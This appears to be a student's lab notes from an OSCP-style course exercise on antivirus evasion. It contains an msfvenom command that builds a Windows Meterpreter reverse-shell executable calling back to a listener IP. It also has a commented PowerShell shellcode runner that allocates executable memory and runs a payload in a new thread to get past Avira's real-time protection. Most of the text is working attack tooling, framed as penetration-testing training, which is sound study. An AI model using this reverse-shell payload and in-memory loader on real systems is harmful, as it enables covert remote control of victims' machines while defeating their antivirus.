# 17.3.3.2

Let's test Antivira. Create a Meterpreter payload.

kali@kali:~/gitWorkspace/pwk/oscpExercises/17_antivirusEvasion$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.119.214 lport=4444 -f exe > binary.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload

Payload size: 341 bytes

```

Ensure Avira has Real-Time Protection ON.

Transfer binary.exe to the Windows client and try to run it. We get a security alert.

## 17.3.3.2.1. Review the code from the PowerShell script and ensure that you have a basic understanding of how it works
```powershell
$code = '

# Import VirtualAlloc from kernel32.dll. This will allow us to allocate memory
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

# Import CreateThread from kernel32.dll. This will allow us to create an execution thread
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

# Import memset from msvcrt.dll. This will help us write arbitrary data to memory
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

#
# NOTE: We are allocating the memory and executing a new thread in the current process (powershell.exe) rather than a rmeote one.
#

$winFunc =
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;


[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

# Allocate a block of memory using VirtualAlloc
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

# Take each byte of the payload stored in the $sc byte array and write it to our newly allocated memory block using memset
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

# Our in-memory written payload is executed in a separate thread using CreateThread
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

## 17.3.3.2.2. Get a meterpreter shell back to your Kali Linux machine using PowerShell.

Create the same Meterpreter payload as earlier but do not save it as binary.exe.
